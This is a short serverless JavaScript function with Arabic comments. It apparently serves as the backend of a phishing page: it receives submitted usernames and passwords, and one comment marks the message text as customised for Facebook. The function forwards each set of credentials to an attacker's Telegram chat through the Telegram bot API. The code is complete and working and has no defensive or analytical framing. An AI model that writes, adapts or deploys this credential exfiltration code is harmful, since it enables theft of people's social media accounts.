
exports.handler = async function (event) {
  // نقبل فقط طلبات POST
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !CHAT_ID) {
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, error: "error" }),
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");
    const username = (data.username || "user error").toString().slice(0, 100);
    const password = (data.password || "pw error").toString().slice(0, 100);
    const result = (data.result || "error idk").toString().slice(0, 100);

    // نص مخصص لفيسبوك
    const text = `\n${username}\n${password}\nا ${result}`;

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text }),
      }
    );

    if (!response.ok) {
      throw new Error("bad T API");
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ ok: true }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, error: err.message }),
    };
  }
};
